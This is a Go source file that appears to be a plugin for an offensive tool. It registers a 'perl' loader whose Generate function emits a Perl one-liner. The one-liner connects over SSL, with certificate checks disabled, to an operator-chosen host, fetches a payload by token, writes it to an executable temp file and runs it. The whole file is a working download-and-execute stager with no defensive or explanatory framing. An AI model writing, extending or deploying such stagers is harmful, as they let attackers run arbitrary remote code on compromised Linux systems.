package loader

import "fmt"

type perlLoader struct{}

func init() { Register(&perlLoader{}) }

func (p *perlLoader) Name() string        { return "perl" }
func (p *perlLoader) Description() string { return "perl IO::Socket::SSL HTTPS pull + exec" }
func (p *perlLoader) RequiresTool() string { return "perl" }

func (p *perlLoader) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (p *perlLoader) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	return fmt.Sprintf(
		`perl -e 'use IO::Socket::SSL;use File::Temp;my $s=IO::Socket::SSL->new(PeerAddr=>"%s:%s",SSL_verify_mode=>0) or die;print $s "GET /p/%s HTTP/1.0\r\nHost: %s\r\n\r\n";my $h=1;my $d="";while(<$s>){if($h){$h=0 if/^\r$/;next}$d.=$_}my($f,$n)=File::Temp::tempfile(UNLINK=>1);print $f $d;close $f;chmod 0755,$n;exec $n'`,
		opts.Host, opts.Port, opts.Token, opts.Host,
	), nil
}
